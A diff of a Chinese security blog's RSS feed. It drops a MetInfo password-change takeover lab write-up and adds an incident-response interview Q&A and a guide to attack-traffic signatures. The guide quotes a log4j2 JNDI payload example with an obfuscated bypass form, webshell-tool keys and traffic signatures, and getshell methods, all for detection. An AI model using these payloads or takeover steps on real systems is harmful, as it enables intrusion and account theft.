@@ -1,34 +1,467 @@
 <?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>路边社周刊</title>
+    <title>write-up</title>
     <link>https://xxxhidexxx.github.io/</link>
-    <description>Recent content on 路边社周刊</description>
+    <description>Recent content on write-up</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>null</copyright>
-    <lastBuildDate>Wed, 13 Mar 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 18 Apr 2024 00:00:00 +0000</lastBuildDate>
     
         <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     
         <item>
-        <title>MetInfo v4.0 越权修改密码</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/lo4/</link>
-        <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
+        <title>基于 python 的无文件木马</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/python-trojan/</link>
+        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://xxxhidexxx.github.io/posts/sec/lo4/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo4/ -&lt;p&gt;这个靶场演示的是 MetInfo v4.0 的 nday。&lt;/p&gt;
-&lt;p&gt;先注册一个账号，找到修改密码，然后抓包。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-0.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-1.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;将 userid 改为任意用户，密码自己设置。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-2.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;用其他人的用户名和自己设置的密码，成功登录到其他人的账号。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-3.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;进入个人中心找到 flag=ywaq{uhgJHzxdIG}。&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/lo4/ - null</description>
+        <guid>https://xxxhidexxx.github.io/posts/sec/python-trojan/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/python-trojan/ -- https://xxxhidexxx.github.io/posts/sec/python-trojan/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>应急响应流程以及相关问答</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/pdcerf/</link>
+        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/pdcerf/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/pdcerf/ -&lt;p&gt;pdcerf：准备-检测-抑制-根除-恢复-总结。&lt;/p&gt;
+&lt;h3 id=&#34;准备&#34;&gt;准备&lt;/h3&gt;
+&lt;p&gt;明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。&lt;/p&gt;
+&lt;p&gt;准备阶段首先要确定能够找到和打开日志文件。&lt;/p&gt;
+&lt;h4 id=&#34;windows-日志文件&#34;&gt;windows 日志文件&lt;/h4&gt;
+&lt;p&gt;日志文件存储在目录 C:\Windows\System32\winevt\Logs 里面。其中 System.evtx, Application.evtx, Security.evtx 这几个日志比较有用。系统日志和应用程序日志对系统管理员更为有用，记录的是故障排除信息；安全日志对调查员更为有用，记录登录、远程访问、进程追踪、身份认证、特权使用、策略变更等涉及安全的事件。&lt;/p&gt;
+&lt;p&gt;需要现场检查主机是否开启了日志的审核策略，例如 windows server 2008 r2 默认不开启审核策略，需要手动开启。&lt;/p&gt;
+&lt;p&gt;按 win+r 输入 eventvwr.msc 可以打开事件查看器。事件 id 有默认的含义：4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。&lt;/p&gt;
+&lt;h4 id=&#34;linux-日志文件&#34;&gt;linux 日志文件&lt;/h4&gt;
+&lt;p&gt;默认存放在 /var/log 目录下。&lt;/p&gt;
+&lt;p&gt;使用 more /etc/rsyslog.conf 查看日志的配置。&lt;/p&gt;
+&lt;p&gt;系统出现问题首先检查 /var/log/message，里面记录了系统的重要信息。&lt;/p&gt;
+&lt;p&gt;/var/log/secure 记录了身份认证和权限管理方面的信息，例如 ssh 登录、su 切换用户，sudo 授权。&lt;/p&gt;
+&lt;p&gt;登录方面有四个文件可供查看，都是二进制文件，不能用 vi 打开，要用特殊的命令查看。/var/log/wtmp 记录全部的登录信息，使用 last 命令查看；/var/log/utmp 记录目前处于登录状态的用户，使用 w,who,users 等命令查看；/var/log/btmp 记录错误登录，使用 lastb 命令查看；/var/log/lastlog 记录所有用户最后登录时间，使用 lastlog 命令查看。&lt;/p&gt;
+&lt;h4 id=&#34;linux-日志分析常用命令&#34;&gt;linux 日志分析常用命令&lt;/h4&gt;
+&lt;h4 id=&#34;tcpip-四层架构对应的常见网络协议&#34;&gt;tcp/ip 四层架构对应的常见网络协议&lt;/h4&gt;
+&lt;p&gt;应用层：http/s，dns，ftp，ssh，dhcp；&lt;/p&gt;
+&lt;p&gt;传输层：tcp，udp；&lt;/p&gt;
+&lt;p&gt;网络层：ip，arp，icmp；&lt;/p&gt;
+&lt;p&gt;网络接口层：以太网 Ethernet，基于以太网的点对点通讯协议 PPPoE&lt;/p&gt;
+&lt;h4 id=&#34;tcp-和-udp-的区别&#34;&gt;tcp 和 udp 的区别&lt;/h4&gt;
+&lt;p&gt;tcp 是面向连接的协议，发送数据前需要三次握手；udp 是无连接的协议，不需要提前确认连接就可以发送数据。&lt;/p&gt;
+&lt;p&gt;tcp 可靠，序号+握手+重传，保证了可靠性；udp 不可靠，需要应用层额外的设计来保证可靠性。&lt;/p&gt;
+&lt;p&gt;tcp 有序，后发送的数据先到达了，tcp 会按照序号重新排序；udp 无序。&lt;/p&gt;
+&lt;p&gt;tcp 传输慢；udp 传输快。&lt;/p&gt;
+&lt;h4 id=&#34;dns-使用的是-tcp-还是-udp&#34;&gt;dns 使用的是 tcp 还是 udp&lt;/h4&gt;
+&lt;p&gt;dns 通常使用 udp，在请求包较大时使用 tcp。因此使用 dns 的请求不易被 tcp 的抓包工具截获。&lt;/p&gt;
+&lt;h4 id=&#34;什么是-ipv4-地址的-a-段-b-段-c-段子网掩码有什么作用&#34;&gt;什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用&lt;/h4&gt;
+&lt;p&gt;A 类是 1.0.0.0 到 126.0.0.0；B 类是 128.0.0.0 到 191.255.255.255；C 类是 192.0.0.0 到 223.255.255.255。此外还有 D 类和 E 类。&lt;/p&gt;
+&lt;p&gt;ABC 三类 ip 分别有私有 ip 段。&lt;/p&gt;
+&lt;p&gt;10.0.0.0～10.255.255.255&lt;/p&gt;
+&lt;p&gt;172.16.0.0～172.31.255.255&lt;/p&gt;
+&lt;p&gt;192.168.0.0～192.168.255.255&lt;/p&gt;
+&lt;p&gt;子网掩码用来标识网络地址和主机地址，将网络划分为若干子网。&lt;/p&gt;
+&lt;h4 id=&#34;什么是-webshell常见的-getshell-方法&#34;&gt;什么是 webshell，常见的 getshell 方法&lt;/h4&gt;
+&lt;p&gt;webshell 是 web 服务器的后门，攻击者利用 webshell 拿下服务器的控制权限，并且是持久性控制。后门是一个总称，木马的作用就是植入后门，webshell 就是一种特殊的木马。&lt;/p&gt;
+&lt;p&gt;常见的 getshell 方法有：&lt;/p&gt;
+&lt;p&gt;（1）利用弱口令漏洞进后台传 webshell。&lt;/p&gt;
+&lt;p&gt;（2）利用任意文件上传漏洞传 webshell。&lt;/p&gt;
+&lt;p&gt;（3）利用 rce 漏洞写 shell，植入多个后门并扩大危害。&lt;/p&gt;
+&lt;p&gt;（4）利用文件包含漏洞/解析漏洞，解析图片马。&lt;/p&gt;
+&lt;p&gt;（5）sql 注入写 shell。&lt;/p&gt;
+&lt;h4 id=&#34;java-内存马的原理&#34;&gt;java 内存马的原理&lt;/h4&gt;
+&lt;p&gt;客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。&lt;/p&gt;
+&lt;p&gt;java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。&lt;/p&gt;
+&lt;p&gt;java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。&lt;/p&gt;
+&lt;p&gt;动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。&lt;/p&gt;
+&lt;h4 id=&#34;上传-webshell-之后怎样获得绝对路径&#34;&gt;上传 webshell 之后怎样获得绝对路径&lt;/h4&gt;
+&lt;p&gt;看返回包；报错信息；fuzz；再传一个 php 探针。&lt;/p&gt;
+&lt;h4 id=&#34;webshell-不出网如何利用&#34;&gt;webshell 不出网如何利用&lt;/h4&gt;
+&lt;p&gt;正向代理，建立 http 隧道；找能出网的协议，例如 dns，icmp 等。&lt;/p&gt;
+&lt;h4 id=&#34;正向代理和反向代理的区别和用途&#34;&gt;正向代理和反向代理的区别和用途&lt;/h4&gt;
+&lt;p&gt;正向代理即客户端代理。用途：（1）访问原来访问不到的资源；（2）缓存，加速访问；（3）隐藏访问者的信息。&lt;/p&gt;
+&lt;p&gt;反向代理即服务器端代理。用途：（1）保证内网安全；（2）实现负载均衡，优化网站负载。&lt;/p&gt;
+&lt;h4 id=&#34;怎么搭建-dns-隧道并上线-cs&#34;&gt;怎么搭建 dns 隧道并上线 cs&lt;/h4&gt;
+&lt;h4 id=&#34;钻石票据黄金票据白银票据的区别&#34;&gt;钻石票据、黄金票据、白银票据的区别&lt;/h4&gt;
+&lt;p&gt;白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。钻石票据能够以任意用户的身份访问任意服务。&lt;/p&gt;
+&lt;h4 id=&#34;设置蜜罐的时候开放哪些端口理由是什么&#34;&gt;设置蜜罐的时候开放哪些端口，理由是什么&lt;/h4&gt;
+&lt;h4 id=&#34;https-加密原理burpsuite-怎么抓-https-包&#34;&gt;https 加密原理，burpsuite 怎么抓 https 包&lt;/h4&gt;
+&lt;h4 id=&#34;常见的反爬虫机制&#34;&gt;常见的反爬虫机制&lt;/h4&gt;
+&lt;h3 id=&#34;检测&#34;&gt;检测&lt;/h3&gt;
+&lt;p&gt;研判攻击流量，保留攻击证据，确定影响的程度和范围，后期和其他厂商联动溯源，最终生成一个防守报告。&lt;/p&gt;
+&lt;p&gt;研判需要对安全设备（天眼、蜜罐、入侵检测、堡垒机、态势感知）和威胁情报平台（微步）比较熟悉。&lt;/p&gt;
+&lt;h4 id=&#34;从几万条告警中区分攻击和误报&#34;&gt;从几万条告警中区分攻击和误报&lt;/h4&gt;
+&lt;p&gt;看 wireshark 判断是否为正常业务。&lt;/p&gt;
+&lt;p&gt;（1）可以记录正常业务的特征，从而在告警信息中排除正常业务。&lt;/p&gt;
+&lt;p&gt;（2）查看 ip，排除内部人员操作引起的误报。&lt;/p&gt;
+&lt;p&gt;（3）如果是扫描引起的误报，可以根据返回包的状态码和返回包大小进行判断。例如发现攻击者扫描 c 段 ip 但是返回 403 则忽略这次误报。&lt;/p&gt;
+&lt;p&gt;（4）从“待分析告警”中提取 exp，例如发现攻击者使用了某个组件 nday 的 exp，但是我们发现网站根本没有使用这个组件，则忽略这次误报。&lt;/p&gt;
+&lt;h4 id=&#34;判断事件类型&#34;&gt;判断事件类型&lt;/h4&gt;
+&lt;p&gt;根据告警确定事件类型，如果是真实攻击则封禁 ip，并检测是否利用成功。&lt;/p&gt;
+&lt;p&gt;常见的事件类型有勒索/挖矿/蠕虫/钓鱼/文件上传/webshell/反弹shell/外联/敏感操作等。&lt;/p&gt;
+&lt;h4 id=&#34;判断失陷范围&#34;&gt;判断失陷范围&lt;/h4&gt;
+&lt;p&gt;根据安全设备确定受到影响的主机和资产。&lt;/p&gt;
+&lt;h4 id=&#34;从告警内网-ip-确定在哪一层楼&#34;&gt;从告警内网 ip 确定在哪一层楼&lt;/h4&gt;
+&lt;p&gt;（1）通过内网 ip 的掩码缩小搜查范围。&lt;/p&gt;
+&lt;p&gt;（2）通过 arp 请求获取 ip 的 mac 地址；&lt;/p&gt;
+&lt;p&gt;（3）从路由器 arp 缓存表找到 mac 地址对应的端口；&lt;/p&gt;
+&lt;p&gt;（4）找到设备所在位置。&lt;/p&gt;
+&lt;h4 id=&#34;内网告警的处理方式&#34;&gt;内网告警的处理方式&lt;/h4&gt;
+&lt;p&gt;（1）根据告警信息定位到出现问题的设备；&lt;/p&gt;
+&lt;p&gt;（2）判断是否为蜜罐。&lt;/p&gt;
+&lt;p&gt;（3）如果是内网扫描先隔离；&lt;/p&gt;
+&lt;p&gt;（4）根据事件类型进行主机排查；&lt;/p&gt;
+&lt;p&gt;（5）根据日志文件进行溯源反制。&lt;/p&gt;
+&lt;h4 id=&#34;怎么判断木马是否上传成功&#34;&gt;怎么判断木马是否上传成功&lt;/h4&gt;
+&lt;p&gt;看数据包响应码，看到 200/500 判断为疑似成功，看到 400 判断为失败；&lt;/p&gt;
+&lt;p&gt;访问木马上传路径；&lt;/p&gt;
+&lt;p&gt;自己复现攻击。&lt;/p&gt;
+&lt;h4 id=&#34;天眼使用经验&#34;&gt;天眼使用经验&lt;/h4&gt;
+&lt;h4 id=&#34;威胁情报平台使用经验&#34;&gt;威胁情报平台使用经验&lt;/h4&gt;
+&lt;h3 id=&#34;抑制&#34;&gt;抑制&lt;/h3&gt;
+&lt;h4 id=&#34;阻止内网横向&#34;&gt;阻止内网横向&lt;/h4&gt;
+&lt;p&gt;允许的话直接断网，或者设置不出网的防火墙策略。严重情况业务下线。&lt;/p&gt;
+&lt;h4 id=&#34;log4j2-原理和流量特征&#34;&gt;log4j2 原理和流量特征&lt;/h4&gt;
+&lt;p&gt;log4j2 是日志组件，其 lookups 机制存在 jndi 注入。&lt;/p&gt;
+&lt;p&gt;判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。&lt;/p&gt;
+&lt;p&gt;log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}&lt;/p&gt;
+&lt;p&gt;log4j2 使用 jndi 注入，找恶意 url。&lt;/p&gt;
+&lt;p&gt;log4j2 流量可以看到 rmi 或者 ldap 字样。&lt;/p&gt;
+&lt;p&gt;log4j2 流量会出现 dns/ip 相关特征。&lt;/p&gt;
+&lt;p&gt;log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}&lt;/p&gt;
+&lt;p&gt;log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid&lt;/p&gt;
+&lt;h4 id=&#34;已知攻击者正在利用-log4j2-漏洞怎么抑制&#34;&gt;已知攻击者正在利用 log4j2 漏洞，怎么抑制&lt;/h4&gt;
+&lt;p&gt;（1）根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。&lt;/p&gt;
+&lt;p&gt;（2）在防火墙的出站策略中阻断对常见 dnslog 平台的访问。&lt;/p&gt;
+&lt;p&gt;（3）排查内存马并清除。&lt;/p&gt;
+&lt;p&gt;（4）通知客户升级组件，进行安全加固。&lt;/p&gt;
+&lt;p&gt;（5）对攻击者进行溯源。&lt;/p&gt;
+&lt;h3 id=&#34;根除&#34;&gt;根除&lt;/h3&gt;
+&lt;h4 id=&#34;怎样排查内存马&#34;&gt;怎样排查内存马&lt;/h4&gt;
+&lt;p&gt;（1）heapdump 内存排查。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;heapdump
+
+strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &amp;quot;POST /&amp;quot;
+
+strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E &amp;quot;/webapps/.*?\!&amp;quot; | sort -u
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;find / -name *.jsp | xargs grep &amp;quot;pass&amp;quot; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；&lt;/p&gt;
+&lt;p&gt;（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。&lt;/p&gt;
+&lt;p&gt;（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。&lt;/p&gt;
+&lt;p&gt;（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。&lt;/p&gt;
+&lt;p&gt;（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。&lt;/p&gt;
+&lt;h4 id=&#34;怎样清除内存马&#34;&gt;怎样清除内存马&lt;/h4&gt;
+&lt;p&gt;（1）客户允许的话，重启。&lt;/p&gt;
+&lt;p&gt;（2）删除 filter 中的恶意代码。&lt;/p&gt;
+&lt;p&gt;（3）中间件注销 filter。&lt;/p&gt;
+&lt;p&gt;（4）使用工具 arthas，VisualVM&lt;/p&gt;
+&lt;h4 id=&#34;内存马无文件落地怎么取证&#34;&gt;内存马无文件落地，怎么取证&lt;/h4&gt;
+&lt;p&gt;流量监测设备找数据包；/var/log/ 日志取证；/var/cache 缓存取证；检测工具。&lt;/p&gt;
+&lt;h4 id=&#34;java-web-中-servletfilterlistener-的区别&#34;&gt;java web 中 servlet/filter/listener 的区别&lt;/h4&gt;
+&lt;p&gt;servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。&lt;/p&gt;
+&lt;p&gt;servlet: 冰蝎内存马&lt;/p&gt;
+&lt;p&gt;filter: struts2&lt;/p&gt;
+&lt;p&gt;listener: spring, log4j&lt;/p&gt;
+&lt;h4 id=&#34;怎样定位-webshell&#34;&gt;怎样定位 webshell&lt;/h4&gt;
+&lt;p&gt;查看安全日志；查看敏感目录；查看未知端口、未知进程；使用杀毒软件，D盾，进行扫描和查杀。&lt;/p&gt;
+&lt;h4 id=&#34;怎样清除-webshell&#34;&gt;怎样清除 webshell&lt;/h4&gt;
+&lt;p&gt;终止进程；删除相关文件。&lt;/p&gt;
+&lt;h4 id=&#34;杀了-webshell-还有外连流量怎样应急&#34;&gt;杀了 webshell 还有外连流量怎样应急&lt;/h4&gt;
+&lt;p&gt;（1）有可能没有完全清除 webshell；&lt;/p&gt;
+&lt;p&gt;（2）有可能其他系统被感染了，进行流量监测找到外连流量对应的系统和设备；&lt;/p&gt;
+&lt;p&gt;（3）有可能攻击者在 getshell 之后植入了后门程序，查找可疑进程，同时进行流量监测。&lt;/p&gt;
+&lt;h4 id=&#34;windows-权限维持方法&#34;&gt;windows 权限维持方法&lt;/h4&gt;
+&lt;h4 id=&#34;windows-排查后门程序&#34;&gt;windows 排查后门程序&lt;/h4&gt;
+&lt;p&gt;注册表可以看远程桌面调用历史。&lt;/p&gt;
+&lt;h4 id=&#34;linux-权限维持方法&#34;&gt;linux 权限维持方法&lt;/h4&gt;
+&lt;h4 id=&#34;linux-排查后门程序&#34;&gt;linux 排查后门程序&lt;/h4&gt;
+&lt;h4 id=&#34;攻击者清理了作案痕迹怎么办&#34;&gt;攻击者清理了作案痕迹怎么办&lt;/h4&gt;
+&lt;p&gt;（1）使用 lsof 恢复被删除的文件；&lt;/p&gt;
+&lt;p&gt;（2）查看日志是否有新增加的用户。&lt;/p&gt;
+&lt;h4 id=&#34;溯源反制手段有哪些&#34;&gt;溯源反制手段有哪些&lt;/h4&gt;
+&lt;p&gt;找到攻击者的真实 ip 地址，得到物理地址。&lt;/p&gt;
+&lt;p&gt;在威胁情报平台查询 ip 的关联事件。&lt;/p&gt;
+&lt;p&gt;如果是服务器 ip，通过网络空间测绘查询该 ip 的其他网段。&lt;/p&gt;
+&lt;p&gt;通过攻击 ip 历史 dns 解析记录/ip 反查域名，进行溯源分析。&lt;/p&gt;
+&lt;p&gt;提取样本特征、用户名、ID、邮箱、C2服务器等信息，对攻击者 id 进行追踪，通过社交平台获取攻击者个人信息。&lt;/p&gt;
+&lt;h4 id=&#34;什么是攻击者画像&#34;&gt;什么是攻击者画像&lt;/h4&gt;
+&lt;p&gt;攻击目的、网络代理、攻击手法；&lt;/p&gt;
+&lt;p&gt;虚拟身份、真实身份、联系方式、组织情况。&lt;/p&gt;
+&lt;h3 id=&#34;恢复&#34;&gt;恢复&lt;/h3&gt;
+&lt;h4 id=&#34;怎么恢复失陷主机的文件&#34;&gt;怎么恢复失陷主机的文件&lt;/h4&gt;
+&lt;p&gt;找小伙伴帮忙。&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+&lt;h4 id=&#34;攻击事件调查报告&#34;&gt;攻击事件调查报告&lt;/h4&gt;
+&lt;p&gt;确定告警真实性之后要生成一个攻击事件调查报告，包含以下内容。&lt;/p&gt;
+&lt;p&gt;（1）攻击者最初的攻击媒介是什么？&lt;/p&gt;
+&lt;p&gt;（2）攻击者如何访问环境？&lt;/p&gt;
+&lt;p&gt;（3）攻击者是否利用漏洞获得了访问权或特权？&lt;/p&gt;
+&lt;p&gt;（4）攻击者如何维持权限进行指挥和控制？&lt;/p&gt;
+&lt;p&gt;（5）攻击在网络或设备上是否有持久性？&lt;/p&gt;
+&lt;p&gt;（6）持久性的方法是什么？（例如后面、shell、合法凭证、远程工具）&lt;/p&gt;
+&lt;p&gt;（7）哪些账号已经被盗用，分别是什么权限？&lt;/p&gt;
+&lt;p&gt;（8）使用什么方法进行侦察？&lt;/p&gt;
+&lt;p&gt;（9）是否发生横向移动，方法是什么？（例如 rdp，恶意软件，用户账号）&lt;/p&gt;
+&lt;p&gt;（10）数据是否被泄露，类型是什么，方法是什么？&lt;/p&gt;
+&lt;h4 id=&#34;写过技站法吗&#34;&gt;写过技站法吗？&lt;/h4&gt;
+- https://xxxhidexxx.github.io/posts/sec/pdcerf/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>攻击流量特征</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/char/</link>
+        <pubDate>Thu, 18 Apr 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/char/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/char/ -&lt;h3 id=&#34;传统漏洞的流量特征&#34;&gt;传统漏洞的流量特征&lt;/h3&gt;
+&lt;h4 id=&#34;sqlxss&#34;&gt;sql&amp;amp;xss&lt;/h4&gt;
+&lt;p&gt;请求包里面有明文 payload，攻击者会尝试很多次，很明显的特征。&lt;/p&gt;
+&lt;h4 id=&#34;rce&#34;&gt;rce&lt;/h4&gt;
+&lt;p&gt;这里只说最基础的，看到内网 ip 和 net user，curl，more，less 等 windows/linux 系统命令，或者 eval，system 等函数，则判断是 rce 攻击流量。&lt;/p&gt;
+&lt;h4 id=&#34;文件包含&#34;&gt;文件包含&lt;/h4&gt;
+&lt;p&gt;看到 require/include 等函数判断是文件包含攻击流量。&lt;/p&gt;
+&lt;h4 id=&#34;任意文件&#34;&gt;任意文件&lt;/h4&gt;
+&lt;p&gt;看到 /etc/passwd 等敏感目录，判断是任意文件读取/下载/删除攻击流量。&lt;/p&gt;
+&lt;p&gt;看到上传文件的包里面有明文木马等恶意代码，判断是任意文件上传攻击流量。&lt;/p&gt;
+&lt;h3 id=&#34;java-反序列化漏洞的流量特征&#34;&gt;java 反序列化漏洞的流量特征&lt;/h3&gt;
+&lt;p&gt;主要考虑 struts2、shiro、weblogic、log4j2、fastjson 等组件及其历史漏洞的流量特征。&lt;/p&gt;
+&lt;h4 id=&#34;java-反序列化数据传输&#34;&gt;java 反序列化数据传输&lt;/h4&gt;
+&lt;p&gt;16 进制编码以 ac ed 00 05 开头，base64 编码为 rO0AB。&lt;/p&gt;
+&lt;p&gt;有的 Content-Type: application/x-serialization 直接说明是 java 序列化数据包。&lt;/p&gt;
+&lt;h4 id=&#34;shiro&#34;&gt;shiro&lt;/h4&gt;
+&lt;p&gt;shiro 的 cookie 存在反序列化注入点。&lt;/p&gt;
+&lt;p&gt;shiro 的流量特征是 cookie 有 rememberme 字段并使用 base64 编码。&lt;/p&gt;
+&lt;p&gt;shiro550 和 shiro721 攻击方法的区别：550 密码撞库，721 填充攻击。&lt;/p&gt;
+&lt;p&gt;如果 shiro cookie 正确，则返回包不会有 set-cookie: rememberme&lt;/p&gt;
+&lt;p&gt;大部分 shiro 的响应包里面有回显。&lt;/p&gt;
+&lt;p&gt;和运维确认 shiro 的版本，如果是 550 则对使用默认 key 的请求解密研判。&lt;/p&gt;
+&lt;h4 id=&#34;log4j2&#34;&gt;log4j2&lt;/h4&gt;
+&lt;p&gt;log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}&lt;/p&gt;
+&lt;p&gt;log4j2 使用 jndi 注入，找恶意 url。&lt;/p&gt;
+&lt;p&gt;log4j2 流量可以看到 rmi 或者 ldap 字样。&lt;/p&gt;
+&lt;p&gt;log4j2 流量会出现 dns/ip 相关特征。&lt;/p&gt;
+&lt;p&gt;log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}&lt;/p&gt;
+&lt;p&gt;log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid&lt;/p&gt;
+&lt;h4 id=&#34;fastjson&#34;&gt;fastjson&lt;/h4&gt;
+&lt;p&gt;fastjson 的强特征是 json 数据以 @type 开头。&lt;/p&gt;
+&lt;p&gt;fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。&lt;/p&gt;
+&lt;p&gt;fastjson 流量会看到 rmi 或者 ldap 字样。&lt;/p&gt;
+&lt;p&gt;fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。&lt;/p&gt;
+&lt;h4 id=&#34;struts2&#34;&gt;struts2&lt;/h4&gt;
+&lt;p&gt;struts 2 的特征是 %{}（或是其 url 编码 %25%7B&amp;hellip;%7D），并且请求体和响应体都包含 payload。&lt;/p&gt;
+&lt;p&gt;struts2 文件类型基本上是 .action 和 .jsp 文件。&lt;/p&gt;
+&lt;h4 id=&#34;weblogic&#34;&gt;weblogic&lt;/h4&gt;
+&lt;p&gt;无强特征，请求体和响应体看到 java 代码则预判为攻击流量。&lt;/p&gt;
+&lt;h3 id=&#34;webshell-工具的流量特征&#34;&gt;webshell 工具的流量特征&lt;/h3&gt;
+&lt;p&gt;这里说的 webshell 流量主要考虑：冰蝎、菜刀、哥斯拉、蚁剑。&lt;/p&gt;
+&lt;h4 id=&#34;冰蝎-behinder&#34;&gt;冰蝎 behinder&lt;/h4&gt;
+&lt;p&gt;冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位，也可能遇到 admin 的 16 位 md5。&lt;/p&gt;
+&lt;p&gt;冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。&lt;/p&gt;
+&lt;p&gt;冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。&lt;/p&gt;
+&lt;p&gt;冰蝎 2.0-3.0 使用 aes 加密 + base64 编码；4.0 不再有连接密码的概念，自定义的传输协议算法就是连接密码。&lt;/p&gt;
+&lt;p&gt;冰蝎 3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application/octet-stream。&lt;/p&gt;
+&lt;p&gt;冰蝎 4.0 弱特征：Accept 字段为 Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可以接受任何格式，但是更倾向于接受 application/json 和 text/javascript。&lt;/p&gt;
+&lt;p&gt;冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。&lt;/p&gt;
+&lt;p&gt;冰蝎 4.0 使用长连接 Connection：Keep-Alive。&lt;/p&gt;
+&lt;h4 id=&#34;菜刀-caidao&#34;&gt;菜刀 caidao&lt;/h4&gt;
+&lt;p&gt;菜刀 php webshell 使用 base64 编码在请求体中对一句话木马进行明文传输，payload 解码后会看到 eval、assert、base64_decode 字样。响应体有两个竖杠||。会使用 base64_decode 函数进行打断 (&amp;quot;@e&amp;quot;.&amp;ldquo;v&amp;rdquo;.&amp;ldquo;al&amp;rdquo;)。&lt;/p&gt;
+&lt;p&gt;菜刀 jsp webshell 的第一段链接流量会看到 i=A&amp;amp;z0=GB2312 字样，第一个参数为 A-Q，第二个参数指定编码。有时会看到 z1、z2 参数写 payload。&lt;/p&gt;
+&lt;p&gt;菜刀 asp webshell 会使用 unicode 编码，payload 使用一句话木马。&lt;/p&gt;
+&lt;h4 id=&#34;哥斯拉-godzilla&#34;&gt;哥斯拉 godzilla&lt;/h4&gt;
+&lt;p&gt;哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。&lt;/p&gt;
